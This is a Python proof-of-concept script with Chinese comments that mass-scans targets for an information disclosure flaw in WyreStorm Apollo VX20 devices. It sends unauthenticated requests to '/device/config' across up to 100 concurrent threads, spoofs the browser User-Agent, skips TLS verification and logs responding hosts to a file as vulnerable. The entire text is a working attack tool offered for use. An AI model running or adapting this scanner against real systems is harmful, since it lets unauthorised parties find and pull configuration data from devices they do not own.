import argparse
import sys
import requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(description='WyreStorm Apollo VX20 信息泄露漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入链接')
    parser.add_argument('-f', '--file', dest='file', type=str, help='文件路径')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        # 从文件中读取URL列表并并发进行检测
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"使用方法:\n\t python {sys.argv[0]} -h")
def poc(target):
    # 构造payload的URL和请求头
    payload_url = '/device/config'
    url = target + payload_url
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip'
    }
    try:
        # 发起GET请求并处理响应
        res = requests.get(url, headers=header, verify=False, timeout=5)
        if res.status_code == 200:
            print(f"[+] 该URL{target}存在漏洞")
            # 将有漏洞的URL写入result.txt文件
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] 该URL{target}不存在漏洞")
    except Exception as e:
        print(f"[*] 该URL{target}存在问题: {e}")
if __name__ == '__main__':
    main()
